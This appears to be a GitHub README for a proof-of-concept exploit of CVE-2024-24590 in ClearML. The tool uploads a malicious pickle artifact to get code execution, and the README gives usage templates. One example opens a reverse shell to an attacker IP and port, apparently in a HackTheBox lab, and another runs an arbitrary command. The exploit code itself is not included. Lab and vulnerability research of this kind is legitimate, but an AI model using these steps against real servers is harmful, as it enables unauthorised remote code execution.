# ClearML Exploit Script

This repository contains a Python exploit script for CVE-2024-24590 The script is designed to upload a malicious pickle file to ClearML, which executes a reverse shell or a custom command.

## Features

- Uploads a malicious pickle artifact to ClearML.
- Executes a reverse shell or a custom command on the target machine.
- Supports custom project and task names.
- Allows setting a tag on the task.

## Usage

### Prerequisites

- Python 3.x
- ClearML SDK
- argparse (usually included with Python)

### Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/diegogarciayala/CVE-2024-24590-ClearML-RCE-CMD-POC.git
    cd CVE-2024-24590-ClearML-RCE-CMD-POC
    ```

2. Install the ClearML SDK:

    ```bash
    pip install clearml
    clearml-init
    ```

### Running the Script

The script supports two modes of operation: `default` and `cmd`.

#### Default Mode

In this mode, you must provide the attacker's IP and port to establish a reverse shell.

```bash
python3 exploit.py default <project_name> <task_name> <attacker_ip> <attacker_port>
```

#### CMD Mode 

In this mode, you can provide a custom command to be executed. 

```bash
python3 exploit.py cmd <project_name> <task_name> --cmd "<your_command>"
```

#### Examples 

```bash
python3 exploit.py default "Black Swan" "pwned4" "10.10.14.10" "1234"
```

```bash
python3 exploit.py cmd "Black Swan" "pwned4" --cmd "touch /tmp/shell.sh"
```

#### whoami
- HackTheBox: sl4sh1t0
- Telegram: sl4sh1t0
- X (Twitter): @diegogarciayala

#### Credits
https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
